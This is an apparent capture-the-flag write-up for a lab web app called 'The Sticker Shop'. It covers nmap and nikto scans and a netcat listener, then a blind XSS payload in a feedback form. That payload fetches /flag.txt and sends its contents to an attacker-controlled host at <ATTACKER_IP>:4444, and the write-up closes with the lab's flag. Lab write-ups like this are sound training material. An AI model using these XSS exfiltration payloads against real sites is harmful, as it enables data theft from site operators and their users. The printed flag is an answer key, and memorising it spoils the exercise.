# The Sticker Shop
Can you exploit the sticker shop in order to capture the flag?

Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

```
ip = 10.10.100.97
```

## Nmap

```
nmap -sC -sV -oN initial.log 10.10.100.97
```

>8080/tcp open  http-proxy Werkzeug/3.0.1 Python/3.8.10
>
>22/tcp   open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)



## Task 1.

```
nikto -h http://10.10.100.97:8080 | tee nikto.log
```

On the webpage, I noticed two sections: a **Home Page** and a **Feedback Page**. To test for XSS vulnerabilities, I decided to use the feedback form.

I started by running a listener on my machine using:

```
nc -lnvp 4444
```

Then, I submitted the following payload as feedback:

```html
<img src='http://<ATTACKER_IP>:4444' />
```

As soon as I submitted the form, I received a connection request on my machine, confirming the XSS vulnerability. 

Next, I attempted to retrieve the contents of `/flag.txt` by submitting the following JavaScript payload as feedback:

```html
<script>
fetch('/flag.txt')
    .then(response => response.text())
    .then(data => {
        fetch('http://<ATTACKER_IP>:4444', {
            method: 'POST',
            body: data
        });
    });
</script>
```

After a few seconds, the flag.txt content was successfully sent to my machine.


## Questions

1. What is the content of flag.txt?
    >THM{83789a69074f636f64a38879cfcabe8b62305ee6}